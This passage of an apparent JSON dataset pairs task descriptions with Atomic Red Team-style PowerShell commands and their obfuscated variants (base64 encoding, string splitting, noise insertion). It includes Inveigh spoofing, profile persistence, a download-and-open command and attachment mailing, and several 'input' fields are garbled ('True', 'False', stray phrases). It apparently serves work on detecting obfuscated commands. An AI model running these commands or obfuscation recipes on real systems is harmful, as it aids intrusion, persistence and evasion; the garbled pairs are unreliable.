    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Send an email with specified sender, recipient, subject, attachments, and SMTP server.",
    "origin_cmd": "Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke Inveigh with specified IP, spoofer IP, and HTTP options.",
    "origin_cmd": "Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Modify the PowerShell profile to include a command to start a process, then exit PowerShell.",
    "origin_cmd": "Add-Content ${PsProfile} -Value \"\" ; Add-Content ${PsProfile} -Value \"Start-Process ${path_exec}\" ; powershell -Command exit"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": The most popular: Freelance downloader: Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": The most popular: Freelance downloader: Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": The most popular: Freelance downloader: Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": ": The most popular: Freelance downloader: Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download content from a remote URL and save it to a local file, then open the file using Invoke-Item.",
    "origin_cmd": "(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}"
  },
  {
    "input": "Execute a command to open WordPad and print a specified file multiple times.",
    "output": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ": Execute a command to open WordPad and print a specified file multiple times. (paraphrase: ****) Execute a command to open WordPad and print a specified file multiple times.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: Open WordPad and print a specified file. Let's: Execute a command to open WordPad.: Open WordPad and print a specified file multiple times.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: I just wrote this: Run a command to open WordPad and print a specified file multiple times.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": "Execute a command to open WordPad and print a specified file multiple times.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ": Execute a command to open WordPad and print a specified file multiple times. (paraphrase: ****) Execute a command to open WordPad and print a specified file multiple times.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: Open WordPad and print a specified file. Let's: Execute a command to open WordPad.: Open WordPad and print a specified file multiple times.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: I just wrote this: Run a command to open WordPad and print a specified file multiple times.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": "Execute a command to open WordPad and print a specified file multiple times.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ": Execute a command to open WordPad and print a specified file multiple times. (paraphrase: ****) Execute a command to open WordPad and print a specified file multiple times.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: Open WordPad and print a specified file. Let's: Execute a command to open WordPad.: Open WordPad and print a specified file multiple times.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ":: I just wrote this: Run a command to open WordPad and print a specified file multiple times.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": "Execute a command to open WordPad and print a specified file multiple times.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
    "input": ": Execute a command to open WordPad and print a specified file multiple times. (paraphrase: ****) Execute a command to open WordPad and print a specified file multiple times.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a command to open WordPad and print a specified file multiple times.",
    "origin_cmd": "cmd /c \"for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}\" | out-null"
  },
  {
